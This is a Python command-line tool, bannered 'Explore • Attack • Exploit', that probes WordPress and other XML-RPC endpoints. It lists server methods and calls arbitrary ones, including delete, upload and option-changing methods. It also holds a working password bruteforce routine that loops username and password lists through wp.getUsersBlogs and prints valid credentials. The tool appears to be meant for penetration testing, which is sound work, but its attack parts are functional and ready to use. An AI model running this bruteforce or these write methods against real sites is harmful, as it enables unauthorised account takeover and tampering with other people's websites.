import xmlrpc.client
import sys
import time

# ===========================
# Helper Functions
# ===========================
def print_menu(options, title="Menu"):
    print("\n" + title)
    print("=" * len(title))
    for k, v in options.items():
        print(f"{k}. {v['desc']}")
    print("0. Back")


def get_choice(options):
    try:
        choice = int(input("Select option: ").strip())
        if choice == 0:
            return 0
        elif choice in options:
            return choice
        else:
            print("Invalid choice!")
            return None
    except ValueError:
        print("Please enter a number!")
        return None

# ===========================
# Test Modules (Dummy Examples)
# ===========================
def test_list_methods(proxy):
    try:
        methods = proxy.system.listMethods()
        print("Available Methods:")
        for m in methods:
            print(" -", m)
    except Exception as e:
        print("[ERROR]", e)


def test_ping(proxy):
    try:
        if hasattr(proxy.system, "methodHelp"):
            result = proxy.system.methodHelp("system.listMethods")
            print("Method Help:", result)
        else:
            print("[INFO] The server does not support 'system.methodHelp'.")
    except Exception as e:
        print("[INFO] The server does not support 'system.methodHelp' or it is disabled.")
        # Optionally print the error: print("[ERROR]", e)

def test_bruteforce(proxy):
    print("[*] Simple XML-RPC bruteforce (WordPress example)")
    username = input("Enter username (or leave blank to use a file): ").strip()
    if not username:
        userfile = input("Enter path to username file: ").strip()
        try:
            with open(userfile, "r") as f:
                usernames = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print("[ERROR] Could not read username file:", e)
            return
    else:
        usernames = [username]

    passfile = input("Enter path to password list file: ").strip()
    try:
        with open(passfile, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print("[ERROR] Could not read password file:", e)
        return

    found = False
    for user in usernames:
        for pwd in passwords:
            try:
                # Try WordPress XML-RPC login
                proxy.wp.getUsersBlogs(user, pwd)
                print(f"[SUCCESS] Username: {user} Password: {pwd}")
                found = True
                # Optionally: return after first success
            except Exception as e:
                # Uncomment for verbose: print(f"[FAIL] {user}:{pwd} -> {e}")
                continue
    if not found:
        print("[*] No valid credentials found.")

def test_authenticated_action(proxy, username, password):
    print(f"[+] Testing with credentials {username}:{password}")
    try:
        # Example: WordPress getUsersBlogs
        result = proxy.wp.getUsersBlogs(username, password)
        print(result)
    except Exception as e:
        print("[ERROR]", e)


def call_method_dynamic(proxy):
    method_name = input("Enter method name (e.g., wp.getUser): ").strip()
    if method_name.lower() == "back":
        return

    # Try to fetch method signature/help
    try:
        sig = proxy.system.methodSignature(method_name)
        if sig and isinstance(sig, list) and len(sig) > 0:
            print("Possible signatures:")
            for s in sig:
                print(" -", s)
        else:
            print("No signature info available.")
    except Exception:
        print("No signature info available.")

    try:
        help_text = proxy.system.methodHelp(method_name)
        if help_text:
            print("Help:", help_text)
    except Exception:
        pass

    # Argument templates for common methods
    method_args_templates = {
        "system.multicall": ["call_array"],
        "system.listMethods": [],
        "system.getCapabilities": [],
        "system.methodHelp": ["methodName"],
        "system.methodSignature": ["methodName"],
        "demo.addTwoNumbers": ["int1", "int2"],
        "demo.sayHello": [],
        "pingback.extensions.getPingbacks": ["url"],
        "pingback.ping": ["sourceURI", "targetURI"],
        "mt.publishPost": ["postid", "username", "password", "publish"],
        "mt.getTrackbackPings": ["postid"],
        "mt.supportedTextFilters": [],
        "mt.supportedMethods": [],
        "mt.setPostCategories": ["postid", "username", "password", "categories"],
        "mt.getPostCategories": ["postid", "username", "password"],
        "mt.getRecentPostTitles": ["blogid", "username", "password", "numberOfPosts"],
        "mt.getCategoryList": ["blogid", "username", "password"],
        "metaWeblog.getUsersBlogs": ["appkey", "username", "password"],
        "metaWeblog.deletePost": ["appkey", "postid", "username", "password", "publish"],
        "metaWeblog.newMediaObject": ["blogid", "username", "password", "data"],
        "metaWeblog.getCategories": ["blogid", "username", "password"],
        "metaWeblog.getRecentPosts": ["blogid", "username", "password", "numberOfPosts"],
        "metaWeblog.getPost": ["postid", "username", "password"],
        "metaWeblog.editPost": ["postid", "username", "password", "struct", "publish"],
        "metaWeblog.newPost": ["blogid", "username", "password", "struct", "publish"],
        "blogger.deletePost": ["appkey", "postid", "username", "password", "publish"],
        "blogger.editPost": ["appkey", "postid", "username", "password", "content", "publish"],
        "blogger.newPost": ["appkey", "blogid", "username", "password", "content", "publish"],
        "blogger.getRecentPosts": ["appkey", "blogid", "username", "password", "numberOfPosts"],
        "blogger.getPost": ["appkey", "postid", "username", "password"],
        "blogger.getUserInfo": ["appkey", "username", "password"],
        "blogger.getUsersBlogs": ["appkey", "username", "password"],
        "wp.getUsersBlogs": ["username", "password"],
        "wp.restoreRevision": ["blog_id", "username", "password", "revision_id"],
        "wp.getRevisions": ["blog_id", "username", "password", "post_id"],
        "wp.getPostTypes": ["blog_id", "username", "password"],
        "wp.getPostType": ["blog_id", "username", "password", "post_type"],
        "wp.getPostFormats": ["blog_id", "username", "password"],
        "wp.getMediaLibrary": ["blog_id", "username", "password", "filter"],
        "wp.getMediaItem": ["blog_id", "username", "password", "attachment_id"],
        "wp.getCommentStatusList": ["blog_id", "username", "password"],
        "wp.newComment": ["blog_id", "username", "password", "post_id", "comment"],
        "wp.editComment": ["blog_id", "username", "password", "comment_id", "content_struct"],
        "wp.deleteComment": ["blog_id", "username", "password", "comment_id"],
        "wp.getComments": ["blog_id", "username", "password", "filter"],
        "wp.getComment": ["blog_id", "username", "password", "comment_id"],
        "wp.setOptions": ["blog_id", "username", "password", "options"],
        "wp.getOptions": ["blog_id", "username", "password", "options"],
        "wp.getPageTemplates": ["blog_id", "username", "password"],
        "wp.getPageStatusList": ["blog_id", "username", "password"],
        "wp.getPostStatusList": ["blog_id", "username", "password"],
        "wp.getCommentCount": ["blog_id", "username", "password", "post_id"],
        "wp.deleteFile": ["blog_id", "username", "password", "file"],
        "wp.uploadFile": ["blog_id", "username", "password", "data"],
        "wp.suggestCategories": ["blog_id", "username", "password", "category"],
        "wp.deleteCategory": ["blog_id", "username", "password", "category_id"],
        "wp.newCategory": ["blog_id", "username", "password", "category"],
        "wp.getTags": ["blog_id", "username", "password"],
        "wp.getCategories": ["blog_id", "username", "password"],
        "wp.getAuthors": ["blog_id", "username", "password"],
        "wp.getPageList": ["blog_id", "username", "password"],
        "wp.editPage": ["blog_id", "username", "password", "page_id", "content_struct", "publish"],
        "wp.deletePage": ["blog_id", "username", "password", "page_id"],
        "wp.newPage": ["blog_id", "username", "password", "content_struct", "publish"],
        "wp.getPages": ["blog_id", "username", "password", "filter"],
        "wp.getPage": ["blog_id", "username", "password", "page_id"],
        "wp.editProfile": ["blog_id", "username", "password", "content_struct"],
        "wp.getProfile": ["blog_id", "username", "password"],
        "wp.getUsers": ["blog_id", "username", "password", "filter"],
        "wp.getUser": ["blog_id", "username", "password", "user_id"],
        "wp.getTaxonomies": ["blog_id", "username", "password"],
        "wp.getTaxonomy": ["blog_id", "username", "password", "taxonomy"],
        "wp.getTerms": ["blog_id", "username", "password", "taxonomy", "filter"],
        "wp.getTerm": ["blog_id", "username", "password", "taxonomy", "term_id"],
        "wp.deleteTerm": ["blog_id", "username", "password", "taxonomy", "term_id"],
        "wp.editTerm": ["blog_id", "username", "password", "taxonomy", "term_id", "content_struct"],
        "wp.newTerm": ["blog_id", "username", "password", "content_struct"],
        "wp.getPosts": ["blog_id", "username", "password", "filter"],
        "wp.getPost": ["blog_id", "username", "password", "post_id"],
        "wp.deletePost": ["blog_id", "username", "password", "post_id"],
        "wp.editPost": ["blog_id", "username", "password", "post_id", "content_struct"],
        "wp.newPost": ["blog_id", "username", "password", "content_struct"],
        # Add more as needed
    }

    # Show possible arguments and prompt for action
    if method_name in method_args_templates:
        arglist = method_args_templates[method_name]
        print("Possible arguments for this method:")
        if arglist:
            for idx, arg in enumerate(arglist, 1):
                print(f"  {idx}. {arg}")
        else:
            print("  (No arguments required)")
    else:
        print("No argument template available for this method.")

    print("1. Proceed to enter arguments and call the method")
    print("0. Back")
    while True:
        action = input("Select option: ").strip()
        if action == "0":
            return
        elif action == "1":
            break
        else:
            print("Invalid option. Please enter 1 or 0.")

    # Prompt for arguments
    args = []
    if method_name in method_args_templates:
        if method_args_templates[method_name]:
            print("Enter arguments for this method:")
            for arg_name in method_args_templates[method_name]:
                val = input(f"  {arg_name}: ").strip()
                import ast
                try:
                    val_eval = ast.literal_eval(val)
                    args.append(val_eval)
                except Exception:
                    args.append(val)
    else:
        args_input = input("Enter arguments as comma-separated values (leave blank for none): ").strip()
        if args_input:
            import ast
            for arg in args_input.split(","):
                arg = arg.strip()
                try:
                    val = ast.literal_eval(arg)
                except Exception:
                    val = arg
                args.append(val)
    try:
        method = proxy
        for part in method_name.split('.'):
            method = getattr(method, part)
        result = method(*args)
        print("Result:", result)
    except Exception as e:
        print("[ERROR]", e)

# ===========================
# Main Program Flow
# ===========================
def print_banner():
    banner = [
        "╔════════════════════════════════════════════════════╗",
        "║            XML-RPC Testing Tool Kit                ║",
        "║             Explore • Attack • Exploit             ║",
        "╠════════════════════════════════════════════════════╣",
        "║  __  ______  _       _ _   ____  ____   ____       ║",
        "║  \\ \\/ /  _ \\| | ___ (_) |_|  _ \\|  _ \\ / ___|      ║",
        "║   \\  /| |_) | |/ _ \\| | __| |_) | |_) | |          ║",
        "║   /  \\|  __/| | (_) | | |_|  _ <|  __/| |___       ║",
        "║  /_/\\_\\_|   |_|\\___/|_|\\__|_| \\_\\_|    \\____|      ║",
        "╠════════════════════════════════════════════════════╣",
        "║  Developed by: Krishanu Bepari                     ║",
        "║  GitHub: github.com/kbepari52                      ║",
        "╚════════════════════════════════════════════════════╝",
        ""
    ]
    for line in banner:
        print(line)
        time.sleep(0.07)

def main():
    print_banner()
    url = input("Enter XML-RPC endpoint URL: ").strip()

    try:
        proxy = xmlrpc.client.ServerProxy(url)
    except Exception as e:
        print("[ERROR] Could not connect:", e)
        sys.exit(1)

    creds = input("Do you have valid credentials? (y/n): ").strip().lower()

    username, password = None, None
    if creds == 'y':
        username = input("Enter username: ").strip()
        password = input("Enter password: ").strip()

    while True:
        if creds == 'y':
            options = {
                1: {"desc": "List XML-RPC Methods", "func": lambda: test_list_methods(proxy)},
                2: {"desc": "Ping methodHelp", "func": lambda: test_ping(proxy)},
                3: {"desc": "Test Authenticated Action", "func": lambda: test_authenticated_action(proxy, username, password)},
                4: {"desc": "Call Any Method (Dynamic)", "func": lambda: call_method_dynamic(proxy)},
            }
        else:
            options = {
                1: {"desc": "List XML-RPC Methods", "func": lambda: test_list_methods(proxy)},
                2: {"desc": "Ping methodHelp", "func": lambda: test_ping(proxy)},
                3: {"desc": "Bruteforce Login (Placeholder)", "func": lambda: test_bruteforce(proxy)},
                4: {"desc": "Call Any Method (Dynamic)", "func": lambda: call_method_dynamic(proxy)},
            }

        print_menu(options, "XML-RPC Testing Menu")
        choice = get_choice(options)

        if choice == 0:
            print("Exiting...")
            break
        elif choice:
            options[choice]["func"]()


if __name__ == "__main__":
    main()
